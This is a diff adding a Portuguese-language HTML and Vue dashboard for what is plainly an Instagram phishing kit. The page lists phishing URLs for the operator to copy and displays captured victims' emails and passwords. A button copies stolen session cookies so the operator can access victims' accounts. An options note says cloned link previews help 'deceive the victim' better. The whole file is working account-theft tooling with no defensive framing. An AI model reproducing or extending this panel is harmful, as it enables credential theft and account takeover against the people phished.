@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Usuários</title>
+	<script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/dayjs@1.10.6/dayjs.min.js"></script>
+	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"
+		integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg=="
+		crossorigin="anonymous" referrerpolicy="no-referrer" />
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+		integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+	<link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+	<div id="app" class="app">
+		<div class="nav" v-if="!isLogin">
+			<div class="menu">
+				<div class="menu-item" @click="abrirOffCanvas()"><i class="fa-solid fa-bars"></i></div>
+			</div>
+			<div class="logo">
+				<i class="fa-brands fa-instagram"></i>
+			</div>
+			<div class="labs">
+				<div :class="['labsItem', { 'click': inicioShow }]" @click="abrirInicio()">Início</div>
+				<div :class="['labsItem', { 'click': opcoesShow }]" @click="abrirOpcoes()">Opções</div>
+				<div :class="['labsItem']" @click="sair">Sair</div>
+			</div>
+
+		</div>
+		<div class="offcanvas offcanvas-start" tabindex="1" id="offcanvasLeft" aria-labelledby="offcanvasLeftLabel"
+			v-if="!isLogin">
+			<div class="offcanvas-header">
+				<div class="logo">
+					<i class="fa-brands fa-instagram"></i>
+				</div>
+				<button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas"
+					aria-label="Close"></button>
+			</div>
+			<div class="offcanvas-body">
+				<div class="slideContent">
+					<div class="labs">
+						<div :class="['labsItem', { 'click': inicioShow }]" @click="abrirInicio()">Início</div>
+						<div :class="['labsItem', { 'click': opcoesShow }]" @click="abrirOpcoes()">Opções</div>
+						<div :class="['labsItem']" @click="sair()">Sair</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- Área de início -->
+		<div class="content" v-if="!isLogin && inicioShow">
+			<div class="container">
+				<div class="container-title">
+					<h2>Painel do Usuário</h2>
+				</div>
+				<div v-for="(url, index) in urls" :key="index">
+				<div class="container-copy">
+					<div class="form-group">
+						<input type="text" id="url" v-model="url.url" class="form-control
+							" placeholder="URL do site" readonly>
+						<button :value="url.url" onclick="app.copyToClipBoard(this);" class="btn btn-primary" title="Copiar link"><i class="fa-regular fa-copy"></i></button>
+					</div>
+				</div>
+				</div>
+				<div class="container-logins">
+
+					<h2>Logins</h2>
+
+					<div class="logins-content">
+						<div v-for="(login, index) in logins" :key="index" class="logins-item">
+							<input type="text" v-model="login.email" class="form-control" readonly>
+							<div class="show-password" readonly>
+								<input type="text" v-model="login.password" class="form-control">
+								<button id="acessar-conta" onclick="app.copyToClipBoard(this);" class="btn btn-primary" title="Acessar Conta Usando Cookies" :value="login.cookie"><i class="fa-solid fa-cookie-bite"></i></a>
+								</button>
+
+							</div>
+						</div>
+
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Área de opções -->
+
+		<div class="opcoes-container" v-if="opcoesShow">
+			<div class="container">
+				<div class="container-title">
+					<h2>Opções do Usuário</h2>
+				</div>
+				<div class="container-options">
+					<div class="form-group">
+						<div class="group-item">
+							<label for="screen-view">Adcionar URL Social Media Preview</label>
+							<input type="checkbox" id="screen-view" v-model="screenView" class="form-check-input">
+						</div>
+
+						<div class="screen-view" v-if="screenView">
+							<div class="view-group">
+								<label for="image">Adicione uma URL</label>
+								<input type="tex" class="form-control" id="image" v-model="image" placeholder="URL da imagem (AINDA NÃO DISPONÍVEL)">
+							</div>
+							<div class="view-group">
+								<label for="text">Info: Uma URL Preview serve para o usuário prever o conteúdo de um site. Você pode colocar o link de qualquer site e a ferramenta vai clonar a URL Preview dele para enganar melhor a vítima.</label>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="save-options">
+					<button class="btn btn-primary" title="Salvar opções"><i class="fa-regular fa-floppy-disk"></i>
+						Salvar opções</button>
+				</div>
+			</div>
+			
+		</div>
+
+		<!-- Área de login -->
+		<div class="login-content" v-if="isLogin">
+			<div class="spinner-border text-light" role="status" v-if="isLoading">
+				<span class="sr-only">Loading...</span>
+			</div>
+			<div class="login-box" v-if="!isLoading">
+				<div class="login-logo">
+					<div class="logo-img">
+						<i class="fa-brands fa-instagram"></i>
+					</div>
+					<h1> Seja Bem-Vindo!</h1>
+					<h3>Insira o seu código para acessar o sistema</h3>
+				</div>
+				<div class="login-box-body">
+					<div class="form">
+						<div class="form-group">
+							<input type="text" id="codigo" v-model="codigo" class="form-control
+								" placeholder="Código do Usuário">
+						</div>
+						<div class="form-group">
+							<button class="btn" @click="fazerLogin(codigo)">Entrar</button>
+						</div>
+					</div>
+
+				</div>
+			</div>
+		</div>
+	</div>
+	</div>
+	</div>
+
+	<script>
+		const { createApp } = Vue;
+
+		const app = createApp({
+			data() {
+				return {
+					isLogin: true,
+					inicioShow: false,
+					opcoesShow: false,
+					codigo: "",
+					token: "",
+					isLoading: false,
+					screenView: false,
+					logins: [],
+					urls: [],
+				}
+			},
+			computed: {
+			},
+			mounted() {
+			},
+			methods: {
+				abrirOffCanvas() {
+					$('#offcanvasLeft').offcanvas('show');
+				},
+				abrirInicio() {
+					$('#offcanvasLeft').offcanvas('hide');
+					this.inicioShow = true
+					this.opcoesShow = false
+				},
+				abrirOpcoes() {
+					$('#offcanvasLeft').offcanvas('hide');
+					this.inicioShow = false
+					this.opcoesShow = true
+				},
+				sair() {
+					$('#offcanvasLeft').offcanvas('hide');
+					this.inicioShow = false
+					this.opcoesShow = false
+					this.isLogin = true;
+					this.token = "";
+					document.cookie = "codigo"+'=deslogado; Max-Age=-99999999;';
+
+				},
+				async fazerLogin(codigo) {
+					this.isLoading = true;
+
+					if (!codigo) {
+						this.isLoading = false;
+						alert("Insira o seu código");
+
+						return;
+					}
+
+					 try {
+					 	const response = await fetch('/login', {  
+						method: 'post',
+						headers: {'Content-Type': 'application/json'},
+						body: JSON.stringify({
+						"codigo" : codigo,
+						"modo" : "painel_login"
+						}),
+						});
+
+					 	const responseJson = await response.json();
+
+
+					if (responseJson["sucesso"]) {
+						this.inicioShow = true;
+						this.isLoading = false;
+						this.isLogin = false;
+						document.cookie = "codigo="+codigo;
+					} else {
+						this.inicioShow = false;
+						this.isLoading = false;
+						this.isLogin = true;
+						document.cookie = "codigo"+'=deslogado; Max-Age=-99999999;';
+						alert(responseJson["msg"]);
+						
+						return
+					}
+
+
+					 } catch (error) {
+					 	console.error('Error:', error);
+					 	this.isLoading = false;
+					 	alert("Erro na requisição Login!")
+					 }
+				},
+				async getUrls() {
+					//this.urls =  [{url: "https://ngrok.com"},{url: "https://bit"}];
+					try {
+					 	const response = await fetch('/getUrls', {  
+						method: 'post',
+						headers: {'Content-Type': 'application/json'},
+						body: JSON.stringify({
+						"modo" : "get_urls"
+						}),
+						});
+
+					 	const responseJson = await response.json();
+					if (responseJson["sucesso"]) {
+						this.urls = responseJson["urls"];
+					} else {
+						alert(responseJson["msg"]);
+						this.inicioShow = false;
+						this.isLoading = true;
+						this.isLogin = true;
+					}	
+
+					 } catch (error) {
+					 	console.error('Error:', error);
+					 	this.isLoading = false;
+					 	alert("Erro na requisição getUrls!")
+					 }
+				},
+				async getLogins() {
+					try {
+					 	const response = await fetch('/getLogins', {  
+						method: 'post',
+						headers: {'Content-Type': 'application/json'},
+						body: JSON.stringify({
+						"modo" : "get_logins"
+						}),
+						});
+
+					 	const responseJson = await response.json();
+					//alert(responseJson["sucesso"]);
+					//alert(responseJson["logins"])
+					if (responseJson["sucesso"]) {
+						this.logins = responseJson["logins"];
+					} else {
+						this.inicioShow = false;
+						this.isLoading = true;
+						this.isLogin = true;
+						alert(responseJson["msg"]);
+					}	
+
+					 } catch (error) {
+					 	console.error('Error:', error);
+					 	this.isLoading = false;
+					 	alert("Erro na requisição getUrls!")
+					 }
+				},
+				async copyToClipBoard(elemento) {
+					var copyText = elemento.value;
+					navigator.clipboard.writeText(copyText);
+					alert("Texto copiado: "+copyText);
+				},
+
+			},
+
+		}).mount("#app");
+
+function getCookieByName(name) {
+     const cookies = document.cookie.split(';');
+     for (let cookie of cookies) {
+          cookie = cookie.trim();
+          if (cookie.startsWith(name + '=')) {
+             return cookie.substring(name.length + 1);
+          }
+     }
+    return null;
+}
+
+
+var codigoCookie = getCookieByName("codigo");
+app.fazerLogin(codigoCookie);
+
+if (app.inicioShow){
+	app.getUrls();
+	app.getLogins();
+}
+
+setInterval(function() {
+	if (app.inicioShow){
+		app.getUrls();
+		app.getLogins();
+	}
+}, 5000);
+
+setInterval(function () {
+	if (app.inicioShow){
+		var codigoCookie = getCookieByName("codigo");
+		app.fazerLogin(codigoCookie);
+	}
+}, 45000);
+
+</script>
+
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+
+</html>
